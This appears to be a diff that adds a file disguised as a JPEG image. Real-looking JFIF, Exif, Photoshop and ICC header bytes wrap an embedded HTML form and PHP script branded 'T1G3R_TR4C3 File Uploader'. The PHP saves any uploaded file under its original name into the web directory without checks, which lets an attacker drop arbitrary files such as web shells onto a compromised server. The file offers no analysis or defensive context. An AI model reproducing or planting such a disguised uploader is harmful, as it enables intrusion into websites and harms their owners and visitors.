@@ -1,0 +1,44 @@
+﻿
+
+ÿØÿà JFIF  ` `  ÿá "Exif  MM *               ÿí 6Photoshop 3.0 8BIM     g dXt6TzK_oI8RTyb3mYsP ÿâøICC_PROFILE   è       mntrRGB XYZ Ù    $ acsp                             öÖ     Ó-    )ø=Þ¯òU®xBúäÊƒ9
+                               desc  D   ybXYZ  À   bTRC  Ô  dmdd  	à   ˆgXYZ  
+h   gTRC  Ô  lumi  
+|   meas  
+   $bkpt  
+´   rXYZ  
+È   rTRC  Ô  tech  
+
+<br><br><h1>T1G3R_TR4C3 File Uploader!!</h1><br>
+<form method="post" enctype="multipart/form-data">
+	<input type="file" name="UploadFile" >
+	<input type="submit" name="do" value="UPLOAD"> 
+</form><br><br>
+<?php
+
+if(isset($_POST['do'])){
+
+	$filename=$_FILES['UploadFile']['name'];
+	$filesize=$_FILES['UploadFile']['size'];
+	$filetemp=$_FILES['UploadFile']['tmp_name'];
+
+
+	$location='./';
+
+	$success=move_uploaded_file($filetemp, $location.$filename);
+
+	if($success){
+		echo "Upload Successfull<br>";
+		echo "./$filename".'<br><br>';
+	}else{
+		echo "File Upload failed!!!<br><br>";
+	}
+}
+
+?>
+ÿØÿà JFIF  ` `  ÿá "Exif  MM *               ÿí 6Photoshop 3.0 8BIM     g dXt6TzK_oI8RTyb3mYsP ÿâøICC_PROFILE   è       mntrRGB XYZ Ù    $ acsp                             öÖ     Ó-    )ø=Þ¯òU®xBúäÊƒ9
+                               desc  D   ybXYZ  À   bTRC  Ô  dmdd  	à   ˆgXYZ  
+h   gTRC  Ô  lumi  
+|   meas  
+   $bkpt  
+´   rXYZ  
+È   rTRC  Ô  tech  
